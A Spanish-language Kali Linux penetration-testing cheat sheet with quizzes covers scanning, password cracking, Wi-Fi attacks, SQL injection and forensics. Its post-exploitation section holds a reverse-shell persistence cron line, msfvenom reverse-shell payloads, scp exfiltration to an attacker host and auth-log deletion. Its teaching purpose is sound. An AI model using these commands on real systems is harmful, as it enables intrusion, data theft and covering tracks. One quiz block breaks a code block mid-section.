---
title: 'Hoja de Trucos de Kali Linux | LabEx'
description: 'Aprenda pruebas de penetración con Kali Linux con esta hoja de trucos completa. Referencia rápida para herramientas de seguridad, hacking ético, escaneo de vulnerabilidades, explotación y pruebas de ciberseguridad.'
pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Hoja de Trucos de Kali Linux
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/es/learn/kali">Aprenda Kali Linux con Laboratorios Prácticos</a>
</base-disclaimer-title>
<base-disclaimer-content>
Aprenda pruebas de penetración con Kali Linux a través de laboratorios prácticos y escenarios del mundo real. LabEx ofrece cursos completos de Kali Linux que cubren comandos esenciales, escaneo de redes, evaluación de vulnerabilidades, ataques de contraseñas, pruebas de aplicaciones web y forense digital. Domine las técnicas de hacking ético y las herramientas de auditoría de seguridad.
</base-disclaimer-content>
</base-disclaimer>

## Configuración y Puesta a Punto del Sistema

### Configuración Inicial: `sudo apt update`

Actualice los paquetes y repositorios del sistema para un rendimiento óptimo.

```bash
# Actualizar repositorio de paquetes
sudo apt update
# Actualizar paquetes instalados
sudo apt upgrade
# Actualización completa del sistema
sudo apt full-upgrade
# Instalar herramientas esenciales
sudo apt install curl wget git
```

### Gestión de Usuarios: `sudo useradd`

Cree y gestione cuentas de usuario para pruebas de seguridad.

```bash
# Añadir nuevo usuario
sudo useradd -m username
# Establecer contraseña
sudo passwd username
# Añadir usuario al grupo sudo
sudo usermod -aG sudo username
# Cambiar de usuario
su - username
```

### Gestión de Servicios: `systemctl`

Controle los servicios y demonios del sistema para escenarios de prueba.

```bash
# Iniciar servicio
sudo systemctl start apache2
# Detener servicio
sudo systemctl stop apache2
# Habilitar servicio al arranque
sudo systemctl enable ssh
# Comprobar estado del servicio
sudo systemctl status postgresql
```

### Configuración de Red: `ifconfig`

Configure las interfaces de red para pruebas de penetración.

```bash
# Mostrar interfaces de red
ifconfig
# Configurar dirección IP
sudo ifconfig eth0 192.168.1.100
# Poner interfaz arriba/abajo
sudo ifconfig eth0 up
# Configurar interfaz inalámbrica
sudo ifconfig wlan0 up
```

### Variables de Entorno: `export`

Configure variables de entorno y rutas para el entorno de prueba.

```bash
# Establecer IP objetivo
export TARGET=192.168.1.1
# Establecer ruta de la lista de palabras
export WORDLIST=/usr/share/wordlists/rockyou.txt
# Ver variables de entorno
env | grep TARGET
```

<BaseQuiz id="kali-env-1" correct="C">
  <template #question>
    ¿Qué sucede con las variables de entorno establecidas con <code>export</code>?
  </template>
  
  <BaseQuizOption value="A">Persisten a través de reinicios del sistema</BaseQuizOption>
  <BaseQuizOption value="B">Solo están disponibles en el archivo actual</BaseQuizOption>
  <BaseQuizOption value="C" correct>Están disponibles para el shell actual y los procesos hijos</BaseQuizOption>
  <BaseQuizOption value="D">Son variables globales del sistema</BaseQuizOption>
  
  <BaseQuizAnswer>
    Las variables de entorno establecidas con <code>export</code> están disponibles para la sesión de shell actual y todos los procesos hijos generados a partir de ella. Se pierden cuando finaliza la sesión del shell a menos que se añadan a archivos de configuración del shell como <code>.bashrc</code>.
  </BaseQuizAnswer>
</BaseQuiz>

### Instalación de Herramientas: `apt install`

Instale herramientas de seguridad adicionales y dependencias.

```bash
# Instalar herramientas adicionales
sudo apt install nmap wireshark burpsuite
# Instalar desde GitHub
git clone https://github.com/tool/repo.git
# Instalar herramientas de Python
pip3 install --user tool-name
```

## Descubrimiento y Escaneo de Red

### Descubrimiento de Hosts: `nmap -sn`

Identifique hosts activos en la red utilizando barridos de ping.

```bash
# Barrido de ping
nmap -sn 192.168.1.0/24
# Escaneo ARP (red local)
nmap -PR 192.168.1.0/24
# Escaneo de eco ICMP
nmap -PE 192.168.1.0/24
# Descubrimiento rápido de hosts
masscan --ping 192.168.1.0/24
```

### Escaneo de Puertos: `nmap`

Escanee puertos abiertos y servicios en ejecución en sistemas objetivo.

```bash
# Escaneo TCP básico
nmap 192.168.1.1
# Escaneo agresivo
nmap -A 192.168.1.1
# Escaneo UDP
nmap -sU 192.168.1.1
# Escaneo SYN sigiloso
nmap -sS 192.168.1.1
```

<BaseQuiz id="kali-nmap-1" correct="B">
  <template #question>
    ¿Qué hace <code>nmap -sS</code>?
  </template>
  
  <BaseQuizOption value="A">Realiza un escaneo UDP</BaseQuizOption>
  <BaseQuizOption value="B" correct>Realiza un escaneo SYN sigiloso (escaneo medio abierto)</BaseQuizOption>
  <BaseQuizOption value="C">Escanea todos los puertos</BaseQuizOption>
  <BaseQuizOption value="D">Realiza detección de SO</BaseQuizOption>
  
  <BaseQuizAnswer>
    El indicador <code>-sS</code> realiza un escaneo SYN (también llamado escaneo medio abierto) porque nunca completa el handshake TCP. Envía paquetes SYN y analiza las respuestas, haciéndolo más sigiloso que un escaneo de conexión TCP completo.
  </BaseQuizAnswer>
</BaseQuiz>

### Enumeración de Servicios: `nmap -sV`

Identifique versiones de servicios y vulnerabilidades potenciales.

```bash
# Detección de versión
nmap -sV 192.168.1.1
# Detección de SO
nmap -O 192.168.1.1
```

<BaseQuiz id="kali-enumeration-1" correct="A">
  <template #question>
    ¿Qué hace <code>nmap -sV</code>?
  </template>
  
  <BaseQuizOption value="A" correct>Detecta versiones de servicios en puertos abiertos</BaseQuizOption>
  <BaseQuizOption value="B">Escanea solo puertos de control de versión</BaseQuizOption>
  <BaseQuizOption value="C">Muestra solo servicios vulnerables</BaseQuizOption>
  <BaseQuizOption value="D">Realiza solo detección de SO</BaseQuizOption>
  
  <BaseQuizAnswer>
    El indicador <code>-sV</code> habilita la detección de versiones, que sondea los puertos abiertos para determinar qué servicio y versión se están ejecutando. Esto es útil para identificar vulnerabilidades potenciales asociadas con versiones de software específicas.
  </BaseQuizAnswer>
</BaseQuiz>
# Escaneo con scripts
nmap -sC 192.168.1.1
# Escaneo exhaustivo
nmap -sS -sV -O -A 192.168.1.1
```

## Recopilación de Información y Reconocimiento

### Enumeración DNS: `dig`

Recopile información DNS y realice transferencias de zona.

```bash
# Búsqueda DNS básica
dig example.com
# Búsqueda DNS inversa
dig -x 192.168.1.1
# Intento de transferencia de zona
dig @ns1.example.com example.com axfr
# Enumeración DNS
dnsrecon -d example.com
```

### Reconocimiento Web: `dirb`

Descubra directorios y archivos ocultos en servidores web.

```bash
# Fuerza bruta de directorios
dirb http://192.168.1.1
# Lista de palabras personalizada
dirb http://192.168.1.1 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# Alternativa Gobuster
gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

### Información WHOIS: `whois`

Recopile información de registro y propiedad de dominios.

```bash
# Búsqueda WHOIS
whois example.com
# WHOIS de IP
whois 8.8.8.8
# Recopilación de información exhaustiva
theharvester -d example.com -l 100 -b google
```

### Análisis SSL/TLS: `sslscan`

Analice la configuración y vulnerabilidades de SSL/TLS.

```bash
# Escaneo SSL
sslscan 192.168.1.1:443
# Análisis exhaustivo con testssl
testssl.sh https://example.com
# Información del certificado SSL
openssl s_client -connect example.com:443
```

### Enumeración SMB: `enum4linux`

Enumere recursos compartidos SMB e información NetBIOS.

```bash
# Enumeración SMB
enum4linux 192.168.1.1
# Listar recursos compartidos SMB
smbclient -L //192.168.1.1
# Conectarse a recurso compartido
smbclient //192.168.1.1/share
# Escaneo de vulnerabilidades SMB
nmap --script smb-vuln* 192.168.1.1
```

### Enumeración SNMP: `snmpwalk`

Recopile información del sistema a través del protocolo SNMP.

```bash
# SNMP walk
snmpwalk -c public -v1 192.168.1.1
# Comprobación SNMP
onesixtyone -c community.txt 192.168.1.1
# Enumeración SNMP
snmp-check 192.168.1.1
```

## Análisis de Vulnerabilidades y Explotación

### Escaneo de Vulnerabilidades: `nessus`

Identifique vulnerabilidades de seguridad utilizando escáneres automatizados.

```bash
# Iniciar servicio Nessus
sudo systemctl start nessusd
# Escaneo OpenVAS
openvas-start
# Escáner de vulnerabilidades web Nikto
nikto -h http://192.168.1.1
# SQLmap para inyección SQL
sqlmap -u "http://example.com/page.php?id=1"
```

### Framework Metasploit: `msfconsole`

Lance exploits y gestione campañas de pruebas de penetración.

```bash
# Iniciar Metasploit
msfconsole
# Buscar exploits
search ms17-010
# Usar exploit
use exploit/windows/smb/ms17_010_eternalblue
# Establecer host remoto
set RHOSTS 192.168.1.1
```

### Pruebas de Desbordamiento de Búfer: `pattern_create`

Genere patrones para la explotación de desbordamiento de búfer.

```bash
# Crear patrón
pattern_create.rb -l 400
# Encontrar desplazamiento
pattern_offset.rb -l 400 -q EIP_value
```

### Desarrollo de Exploits Personalizados: `msfvenom`

Cree cargas útiles personalizadas para objetivos específicos.

```bash
# Generar shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
# Shell inverso de Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
# Shell inverso de Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
```

## Ataques de Contraseñas y Pruebas de Credenciales

### Ataques de Fuerza Bruta: `hydra`

Realice ataques de fuerza bruta de inicio de sesión contra varios servicios.

```bash
# Fuerza bruta SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
# Fuerza bruta de formulario HTTP
hydra -l admin -P passwords.txt 192.168.1.1 http-form-post "/login:username=^USER^&password=^PASS^:Invalid"
# Fuerza bruta FTP
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

### Descifrado de Hashes: `hashcat`

Descifre hashes de contraseñas utilizando aceleración por GPU.

```bash
# Descifrado de hash MD5
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Descifrado de hash NTLM
hashcat -m 1000 -a 0 ntlm.hash wordlist.txt
# Generar variaciones de lista de palabras
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
```

### John the Ripper: `john`

Descifrado de contraseñas tradicional con varios modos de ataque.

```bash
# Descifrar archivo de contraseñas
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
# Mostrar contraseñas descifradas
john --show shadow.txt
# Modo incremental
john --incremental shadow.txt
# Reglas personalizadas
john --rules --wordlist=passwords.txt shadow.txt
```

### Generación de Listas de Palabras: `crunch`

Cree listas de palabras personalizadas para ataques dirigidos.

```bash
# Generar lista de palabras de 4 a 8 caracteres
crunch 4 8 -o wordlist.txt
# Conjunto de caracteres personalizado
crunch 6 6 -t admin@ -o passwords.txt
# Generación basada en patrones
crunch 8 8 -t @@@@%%%% -o mixed.txt
```

## Pruebas de Seguridad de Redes Inalámbricas

### Configuración del Modo Monitor: `airmon-ng`

Configure el adaptador inalámbrico para la captura de paquetes e inyección.

```bash
# Habilitar modo monitor
sudo airmon-ng start wlan0
# Comprobar procesos interferentes
sudo airmon-ng check kill
# Detener modo monitor
sudo airmon-ng stop wlan0mon
```

### Descubrimiento de Redes: `airodump-ng`

Descubra y monitoree redes inalámbricas y clientes.

```bash
# Escanear todas las redes
sudo airodump-ng wlan0mon
# Dirigirse a una red específica
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Mostrar solo redes WEP
sudo airodump-ng --encrypt WEP wlan0mon
```

### Ataques WPA/WPA2: `aircrack-ng`

Realice ataques contra redes cifradas WPA/WPA2.

```bash
# Ataque de desautenticación
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Descifrar handshake capturado
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
# Ataque WPS con Reaver
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```

### Ataque de Doble Trampa (Evil Twin): `hostapd`

Cree puntos de acceso no autorizados para la recolección de credenciales.

```bash
# Iniciar AP no autorizado
sudo hostapd hostapd.conf
# Servicio DHCP
sudo dnsmasq -C dnsmasq.conf
# Capturar credenciales
ettercap -T -M arp:remote /192.168.1.0/24//
```

## Pruebas de Seguridad de Aplicaciones Web

### Pruebas de Inyección SQL: `sqlmap`

Detección y explotación automatizadas de inyección SQL.

```bash
# Prueba básica de inyección SQL
sqlmap -u "http://example.com/page.php?id=1"
# Probar parámetros POST
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
# Extraer base de datos
sqlmap -u "http://example.com/page.php?id=1" --dbs
# Volcar tabla específica
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
```

### Cross-Site Scripting: `xsser`

Pruebe vulnerabilidades XSS en aplicaciones web.

```bash
# Pruebas XSS
xsser --url "http://example.com/search.php?q=XSS"
# Detección automatizada de XSS
xsser -u "http://example.com" --crawl=10
# Carga útil personalizada
xsser --url "http://example.com" --payload="<script>alert(1)</script>"
```

### Integración con Burp Suite: `burpsuite`

Plataforma integral de pruebas de seguridad de aplicaciones web.

```bash
# Iniciar Burp Suite
burpsuite
# Configurar proxy (127.0.0.1:8080)
# Configurar el proxy del navegador para capturar tráfico
# Usar Intruder para ataques automatizados
# Usar Spider para descubrimiento de contenido
```

### Recorrido de Directorios: `wfuzz`

Pruebe vulnerabilidades de recorrido de directorios e inclusión de archivos.

```bash
# Fuerza bruta de directorios
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ
# Fuerza bruta de parámetros
wfuzz -c -z file,payloads.txt "http://example.com/page.php?file=FUZZ"
```

## Post-Explotación y Escalada de Privilegios

### Enumeración del Sistema: `linpeas`

Enumeración automatizada de escalada de privilegios para sistemas Linux.

```bash
# Descargar LinPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
# Hacer ejecutable
chmod +x linpeas.sh
# Ejecutar enumeración
./linpeas.sh
# Alternativa para Windows: winPEAS.exe
```

### Mecanismos de Persistencia: `crontab`

Establecer persistencia en sistemas comprometidos.

```bash
# Editar crontab
crontab -e
# Añadir shell inverso
@reboot /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
# Persistencia de clave SSH
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

### Exfiltración de Datos: `scp`

Transfiera datos de forma segura desde sistemas comprometidos.

```bash
# Copiar archivo a la máquina del atacante
scp file.txt user@192.168.1.100:/tmp/
# Comprimir y transferir
tar -czf data.tar.gz /home/user/documents
scp data.tar.gz attacker@192.168.1.100:/tmp/
# Exfiltración HTTP
python3 -m http.server 8000
```

### Cubrir Huellas: `history`

Elimine evidencia de actividades en sistemas comprometidos.

```bash
# Borrar historial de bash
history -c
unset HISTFILE
# Borrar entradas específicas
history -d line_number
# Borrar registros del sistema
sudo rm /var/log/auth.log*
```

## Forense Digital y Análisis

### Creación de Imágenes de Disco: `dd`

Cree imágenes forenses de dispositivos de almacenamiento.

```bash
# Crear imagen de disco
sudo dd if=/dev/sdb of=/tmp/evidence.img bs=4096 conv=noerror,sync
# Verificar integridad de la imagen
md5sum /dev/sdb > original.md5
md5sum /tmp/evidence.img > image.md5
# Montar imagen
sudo mkdir /mnt/evidence
sudo mount -o ro,loop /tmp/evidence.img /mnt/evidence
```

### Recuperación de Archivos: `foremost`

Recupere archivos eliminados de imágenes de disco o unidades.

```bash
# Recuperar archivos de la imagen
foremost -i evidence.img -o recovered/
# Tipos de archivo específicos
foremost -t jpg,png,pdf -i evidence.img -o photos/
# Alternativa PhotoRec
photorec evidence.img
```

### Análisis de Memoria: `volatility`

Analice volcados de RAM en busca de evidencia forense.

```bash
# Identificar perfil del SO
volatility -f memory.dump imageinfo
# Listar procesos
volatility -f memory.dump --profile=Win7SP1x64 pslist
# Extraer proceso
volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234 -D output/
```

### Análisis de Paquetes de Red: `wireshark`

Analice capturas de tráfico de red en busca de evidencia forense.

```bash
# Iniciar Wireshark
wireshark
# Análisis en línea de comandos
tshark -r capture.pcap -Y "http.request.method==GET"
# Extraer archivos
foremost -i capture.pcap -o extracted/
```

## Generación de Informes y Documentación

### Captura de Pantallas: `gnome-screenshot`

Documente los hallazgos con captura de pantalla sistemática.

```bash
# Captura de pantalla completa
gnome-screenshot -f screenshot.png
# Captura de ventana
gnome-screenshot -w -f window.png
# Captura con retardo
gnome-screenshot -d 5 -f delayed.png
# Selección de área
gnome-screenshot -a -f area.png
```

### Gestión de Registros: `script`

Grabe sesiones de terminal con fines de documentación.

```bash
# Iniciar grabación de sesión
script session.log
# Grabar con temporización
script -T session.time session.log
# Reproducir sesión
scriptreplay session.time session.log
```

### Plantillas de Informes: `reportlab`

Genere informes profesionales de pruebas de penetración.

```bash
# Instalar herramientas de informes
pip3 install reportlab
# Generar informe PDF
python3 generate_report.py
# Markdown a PDF
pandoc report.md -o report.pdf
```

### Integridad de la Evidencia: `sha256sum`

Mantenga la cadena de custodia con hashes criptográficos.

```bash
# Generar sumas de verificación
sha256sum evidence.img > evidence.sha256
# Verificar integridad
sha256sum -c evidence.sha256
# Sumas de verificación de múltiples archivos
find /evidence -type f -exec sha256sum {} \; > all_files.sha256
```

## Mantenimiento y Optimización del Sistema

### Gestión de Paquetes: `apt`

Mantenga y actualice los paquetes del sistema y las herramientas de seguridad.

```bash
# Actualizar listas de paquetes
sudo apt update
# Actualizar todos los paquetes
sudo apt upgrade
# Instalar herramienta específica
sudo apt install tool-name
# Eliminar paquetes no utilizados
sudo apt autoremove
```

### Actualizaciones del Kernel: `uname`

Supervise y actualice el kernel del sistema para parches de seguridad.

```bash
# Comprobar kernel actual
uname -r
# Listar kernels disponibles
apt list --upgradable | grep linux-image
# Instalar nuevo kernel
sudo apt install linux-image-generic
# Eliminar kernels antiguos
sudo apt autoremove --purge
```

### Verificación de Herramientas: `which`

Verifique las instalaciones de herramientas y localice ejecutables.

```bash
# Localizar herramienta
which nmap
# Comprobar si la herramienta existe
command -v metasploit
# Listar todas las herramientas en el directorio
ls /usr/bin/ | grep -i security
```

### Monitoreo de Recursos: `htop`

Monitoree los recursos del sistema durante pruebas de seguridad intensivas.

```bash
# Visor de procesos interactivo
htop
# Uso de memoria
free -h
# Uso de disco
df -h
# Conexiones de red
netstat -tulnp
```

## Atajos y Alias Esenciales de Kali Linux

### Crear Alias: `.bashrc`

Configure atajos de comandos para ahorrar tiempo en tareas frecuentes.

```bash
# Editar bashrc
nano ~/.bashrc
# Alias útiles
alias ll='ls -la'
alias nse='nmap --script-help'
alias target='export TARGET='
alias msf='msfconsole -q'
# Recargar bashrc
source ~/.bashrc
```

### Funciones Personalizadas: `function`

Cree combinaciones de comandos avanzadas para flujos de trabajo comunes.

```bash
# Función de escaneo rápido nmap
function qscan() {
    nmap -sS -sV -O $1
}
# Configuración de pruebas de penetración
function pentest-setup() {
    mkdir -p {recon,scans,exploits,loot}
}
```

### Atajos de Teclado: Terminal

Domine los atajos de teclado esenciales para una navegación más rápida.

```bash
# Atajos de terminal
# Ctrl+C - Detener comando actual
# Ctrl+Z - Suspender comando actual
# Ctrl+L - Limpiar pantalla
# Ctrl+R - Buscar en el historial de comandos
# Tab - Autocompletar comandos
# Arriba/Abajo - Navegar por el historial de comandos
```

### Configuración del Entorno: `tmux`

Configure sesiones de terminal persistentes para tareas de larga duración.

```bash
# Iniciar nueva sesión
tmux new-session -s pentest
# Desconectar sesión
# Ctrl+B, D
# Listar sesiones
tmux list-sessions
# Adjuntar a sesión
tmux attach -t pentest
```

## Enlaces Relevantes

- <router-link to="/linux">Hoja de Trucos de Linux</router-link>
- <router-link to="/shell">Hoja de Trucos de Shell</router-link>
- <router-link to="/cybersecurity">Hoja de Trucos de Ciberseguridad</router-link>
- <router-link to="/nmap">Hoja de Trucos de Nmap</router-link>
- <router-link to="/wireshark">Hoja de Trucos de Wireshark</router-link>
- <router-link to="/hydra">Hoja de Trucos de Hydra</router-link>
- <router-link to="/devops">Hoja de Trucos de DevOps</router-link>
- <router-link to="/docker">Hoja de Trucos de Docker</router-link>
